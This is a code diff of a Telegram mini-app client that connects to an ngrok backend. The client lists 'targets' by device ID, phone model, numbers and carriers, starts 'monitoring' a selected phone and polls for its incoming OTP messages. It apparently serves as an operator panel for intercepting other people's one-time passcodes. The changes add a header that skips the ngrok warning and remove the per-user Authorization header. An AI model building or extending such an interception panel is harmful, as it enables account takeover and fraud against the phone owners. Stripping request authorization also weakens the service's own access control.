@@ -40,7 +40,7 @@
 
     <script>
         // ========== CONFIG ==========
-        const API = 'https://limit-crispness-uncork.ngrok-free.dev';   // <--- CHANGE THIS
+        const API = 'https://limit-crispness-uncork.ngrok-free.dev';   // <--- apna ngrok URL (bina slash)
         const tg = Telegram.WebApp;
         tg.ready();
         const userId = tg.initDataUnsafe?.user?.id || null;
@@ -58,6 +58,12 @@
         console.log('Mini app started, userId:', userId);
         console.log('API base:', API);
 
+        // Common header to skip ngrok warning
+        const HEADERS = {
+            'ngrok-skip-browser-warning': 'true',
+            'Content-Type': 'application/json'
+        };
+
         // ----- Tab switching -----
         window.switchTab = function(tab) {
             document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
@@ -72,7 +78,7 @@
         async function loadTargets() {
             try {
                 console.log('Fetching targets...');
-                let res = await fetch(`${API}/api/targets`, { headers: {'Authorization': userId} });
+                let res = await fetch(`${API}/api/targets`, { headers: HEADERS });
                 console.log('Response status:', res.status);
                 if (!res.ok) throw new Error('HTTP ' + res.status);
                 allTargets = await res.json();
@@ -112,12 +118,25 @@
         // ----- Monitoring -----
         window.startMonitor = async function(did, dbIndex, phone1, model, phone2, car1, car2) {
             if (monitorActive) {
-                await fetch(`${API}/api/monitor`, { method: 'DELETE', headers: {'Content-Type':'application/json'}, body: JSON.stringify({user_id: userId}) });
+                await fetch(`${API}/api/monitor`, {
+                    method: 'DELETE',
+                    headers: HEADERS,
+                    body: JSON.stringify({user_id: userId})
+                });
             }
             await fetch(`${API}/api/monitor`, {
                 method: 'POST',
-                headers: {'Content-Type':'application/json'},
-                body: JSON.stringify({ user_id: userId, did, db_index: dbIndex, phone1, model, phone2, carrier1: car1, carrier2: car2 })
+                headers: HEADERS,
+                body: JSON.stringify({
+                    user_id: userId,
+                    did: did,
+                    db_index: dbIndex,
+                    phone1: phone1,
+                    model: model,
+                    phone2: phone2,
+                    carrier1: car1,
+                    carrier2: car2
+                })
             });
             monitorActive = true;
             tg.showAlert(`Monitoring ${phone1}`);
@@ -130,7 +149,7 @@
         // ----- OTP Polling -----
         async function pollOTP() {
             try {
-                let res = await fetch(`${API}/api/otp/${userId}?since=${lastOtpTs}`);
+                let res = await fetch(`${API}/api/otp/${userId}?since=${lastOtpTs}`, { headers: HEADERS });
                 if (!res.ok) return;
                 let msgs = await res.json();
                 if (msgs.length) {
@@ -147,7 +166,7 @@
         // ----- Favourites -----
         async function loadFavourites() {
             try {
-                let res = await fetch(`${API}/api/favourites/${userId}`);
+                let res = await fetch(`${API}/api/favourites/${userId}`, { headers: HEADERS });
                 if (!res.ok) throw new Error('Failed');
                 let favs = await res.json();
                 let html = '';
@@ -170,7 +189,7 @@
         window.addFavourite = async function(did, phone1, phone2, car1, car2, model, dbIndex) {
             await fetch(`${API}/api/favourites/${userId}`, {
                 method: 'POST',
-                headers: {'Content-Type':'application/json'},
+                headers: HEADERS,
                 body: JSON.stringify({ did, phone1, phone2, carrier1: car1, carrier2: car2, model, db_index: dbIndex })
             });
             tg.showAlert('Added to favourites');
@@ -179,7 +198,7 @@
         window.removeFavourite = async function(did) {
             await fetch(`${API}/api/favourites/${userId}`, {
                 method: 'DELETE',
-                headers: {'Content-Type':'application/json'},
+                headers: HEADERS,
                 body: JSON.stringify({ did })
             });
             loadFavourites();
